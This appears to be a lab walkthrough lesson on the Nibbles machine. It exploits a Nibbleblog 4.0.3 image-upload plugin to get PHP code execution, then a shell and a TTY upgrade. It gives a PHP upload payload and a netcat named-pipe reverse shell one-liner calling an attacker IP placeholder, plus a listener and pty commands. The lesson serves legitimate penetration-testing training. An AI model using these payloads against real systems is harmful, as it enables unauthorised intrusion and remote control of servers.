# Nibbles: Initial Foothold

## Overview

With admin credentials to the Nibbleblog CMS guessed from site content in the previous lesson, this stage turns that access into remote code execution and a working reverse shell on the target.

## Learning Objectives

- Explore a CMS admin panel for exploitable functionality
- Abuse a plugin-based file upload to achieve PHP code execution
- Confirm RCE before committing to a full reverse shell payload
- Upgrade a basic PHP RCE into an interactive reverse shell
- Diagnose and work around a missing Python2 interpreter during TTY upgrade

## Admin Panel Exploration

After logging into `admin.php`, the Nibbleblog admin portal exposes several sections: Publish, Comments, Manage, Settings (which confirmed the vulnerable v4.0.3 version), Themes, and **Plugins**. The "My image" plugin stood out — it allows image file uploads, which is a classic PHP upload vector if the file type isn't properly validated server-side.

## Exploiting the Image Upload Plugin

A test payload was uploaded through the plugin in place of a real image:

```php
<?php system('id'); ?>
```

The upload "succeeded" despite several PHP image-processing warnings in the response (`imagesx()`, `imagecreatetruecolor()`, etc. complaining about expecting a resource but getting a boolean). These warnings are actually a **good** sign here — they confirm the application tried (and failed) to process the file as an image, but saved the file to disk regardless.

## Confirming RCE

Using the directory structure already mapped out via gobuster, the uploaded file was located at:

```
http://<host>/nibbleblog/content/private/plugins/my_image/image.php
```

```bash
curl http://<ip>/nibbleblog/content/private/plugins/my_image/image.php
```

This returned `uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)` — confirming arbitrary command execution as the `nibbler` user.

## Upgrading to a Reverse Shell

With RCE confirmed, the payload was upgraded to a reverse shell using the classic named-pipe one-liner (works without needing netcat's `-e` flag):

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING_IP> <PORT> >/tmp/f
```

Wrapped inside the PHP payload:

```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING_IP> <PORT> >/tmp/f"); ?>
```

Steps: start a listener, re-upload the wrapped payload through the same plugin, then trigger it by requesting `image.php` again (curl or browser):

```bash
nc -lvnp <PORT>
```

## TTY Upgrade

The usual Python2 pty trick failed — Python2 wasn't installed on this target:

```bash
which python3
```

Confirmed only Python3 was present, so the Python3 variant was used instead:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Post-Foothold Enumeration

In `/home/nibbler`, two items of interest were found: `user.txt` and a `personal.zip` archive — picked up in the next lesson's privilege escalation path.

## Skills Practiced

- CMS admin panel exploration for exploitable features
- File-upload-to-RCE exploitation via a vulnerable plugin
- Reverse shell delivery through a confirmed RCE vector
- TTY upgrade troubleshooting when the expected interpreter is missing

## Key Takeaways

- PHP warnings in a response aren't always a failure signal — here they actually confirmed the uploaded file was saved, just not processed as a valid image.
- Confirming RCE with a harmless command (`id`) before committing to a reverse shell payload avoids wasted listener setups on a vector that doesn't actually work.
- Never assume a specific interpreter (Python2) is available — check first with `which`, and fall back to Python3 syntax when needed.
- Directory structure already mapped during web footprinting (gobuster output) paid off directly here, locating the uploaded file without guessing.
